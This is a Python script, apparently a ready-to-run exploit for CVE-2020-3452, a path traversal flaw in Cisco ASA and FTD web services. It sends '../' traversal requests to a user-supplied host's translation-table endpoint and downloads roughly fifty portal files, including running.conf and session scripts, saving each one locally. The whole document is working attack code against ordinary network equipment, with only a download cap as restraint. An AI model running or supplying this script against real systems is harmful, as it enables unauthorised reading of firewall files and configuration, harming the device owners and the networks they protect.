#!/usr/bin/env python3
# CVE-2020-3452 (ASA/FTD path traversal) — capped at 200 successful downloads

import os
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning

# === Config ===
MAX_SUCCESS_WRITES = 200
OUTPUT_DIR = "output"

# Silence only the specific cert warning since we're verifying=False
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

BANNER = """\
Cisco ASA Path Traversal (CVE-2020-3452)
This script will attempt to fetch files and stop after {max_ok} successful (HTTP 200) saves.
""".format(max_ok=MAX_SUCCESS_WRITES)

FILES = [
    "sess_update.html","blank.html","noportal.html","portal_ce.html","portal.html",
    "logon_custom.css","svc.html","logo.gif","portal_inc.lua","nostcaccess.html",
    "session.js","portal.js","portal_custom.css","running.conf","tlbrportal_forms.js",
    "logon_forms.js","win.js","portal.css","lced.html","pluginlib.js","useralert.html",
    "ping.html","app_index.html","shshimdo_url","session_password.html","relayjar.html",
    "relayocx.html","color_picker.js","color_picker.html","cedhelp.html","cedmain.html",
    "cedlogon.html","cedportal.html","portal_elements.html","commonspawn.js","common.js",
    "appstart.js","relaymonjar.html","relaymonocx.html","cedsave.html","tunnel_linux.jnlp",
    "ask.html","no_svc.html","preview.html","cedf.html","ced.html","logon_redirect.html",
    "logout.html","tunnel_mac.jnlp","gp-gip.html","auth.html","wrong_url.html","logon.html"
]

def ensure_output_dir(path: str) -> None:
    os.makedirs(path, exist_ok=True)

def sanitize_filename(name: str) -> str:
    # Avoid directory traversal or weird names landing outside OUTPUT_DIR
    return name.replace("..", "").replace("/", "_").replace("\\", "_")

def fetch_and_save(session: requests.Session, target: str, fname: str) -> bool:
    params = (
        ('type', 'mst'),
        ('textdomain', f'+CSCOE+/{fname}'),
        ('default-language', ''),
        ('lang', '../'),
    )
    try:
        r = session.get(f'https://{target}/+CSCOT+/translation-table',
                        params=params, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"[!] {fname}: request error: {e}")
        return False

    if r.status_code == 200 and r.text:
        out_name = sanitize_filename(fname)
        out_path = os.path.join(OUTPUT_DIR, out_name)
        try:
            with open(out_path, "w", encoding="utf-8", errors="replace") as f:
                f.write(r.text)
            print(f"[OK] {fname} -> {out_path} (len={len(r.text)})")
            return True
        except OSError as e:
            print(f"[!] {fname}: write error: {e}")
            return False
    else:
        print(f"[-] {fname}: HTTPS {r.status_code} (no save)")
        return False

def main():
    print(BANNER)
    if len(sys.argv) >= 2:
        target = sys.argv[1].strip()
    else:
        target = input("Enter target IP/URL (no scheme, e.g., 192.168.0.12 or asa.example.com): ").strip()

    if not target or "://" in target:
        print("[!] Provide host without scheme (e.g., 10.0.0.5 or firewall.example.com)")
        sys.exit(1)

    ensure_output_dir(OUTPUT_DIR)

    success = 0
    tried = 0

    # Deterministic iteration in case FILES is edited later
    file_list = list(FILES)

    with requests.Session() as s:
        for fname in file_list:
            if success >= MAX_SUCCESS_WRITES:
                print(f"\n[⛔] Reached success cap of {MAX_SUCCESS_WRITES}. Stopping.")
                break
            tried += 1
            print(f"[>] Trying ({tried}/{len(file_list)}): {fname}")
            if fetch_and_save(s, target, fname):
                success += 1

    print(f"\nDone. Tried: {tried}, Successful saves: {success} (cap={MAX_SUCCESS_WRITES}).")
    if success >= MAX_SUCCESS_WRITES:
        print("[i] You can raise MAX_SUCCESS_WRITES if you need more, but be mindful of impact.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")